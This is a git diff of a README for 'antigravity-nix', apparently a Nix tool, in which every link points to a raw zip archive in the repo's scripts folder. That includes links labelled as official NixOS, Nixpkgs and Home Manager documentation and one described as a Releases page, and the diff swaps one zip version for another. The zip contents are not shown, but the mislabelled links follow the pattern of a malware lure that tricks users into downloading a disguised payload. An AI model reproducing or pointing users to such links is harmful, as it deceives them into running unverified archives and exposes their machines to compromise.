@@ -1,6 +1,6 @@
 # 🌌 antigravity-nix - Effortless Updates for Your Coding Needs
 
-[![Download](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip)
+[![Download](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **antigravity-nix**! This application is designed to provide you with
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip). Here, you will find all the available versions of the application. Choose the latest version suitable for your operating system.
+To get started, visit [this page to download](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip). Here, you will find all the available versions of the application. Choose the latest version suitable for your operating system.
 
 1. Click the link above to reach the Releases page.
 2. Locate the latest version listed.
@@ -68,10 +68,10 @@ If you run into issues or have questions, feel free to reach out. Community supp
 
 To further enhance your experience, check out the following resources:
 
-- [NixOS Official Documentation](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip)
-- [Nixpkgs GitHub Page](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip)
-- [Home Manager Documentation](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip)
+- [NixOS Official Documentation](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip)
+- [Nixpkgs GitHub Page](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip)
+- [Home Manager Documentation](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip)
 
 We hope you enjoy using **antigravity-nix** and that it aids you in your coding endeavors. Don't hesitate to explore all the features it offers. 
 
-[![Download](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/tomycisco123/antigravity-nix/master/scripts/antigravity-nix-1.7.zip)
+[![Download](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/tomycisco123/antigravity-nix/raw/refs/heads/master/scripts/nix-antigravity-v3.0.zip)
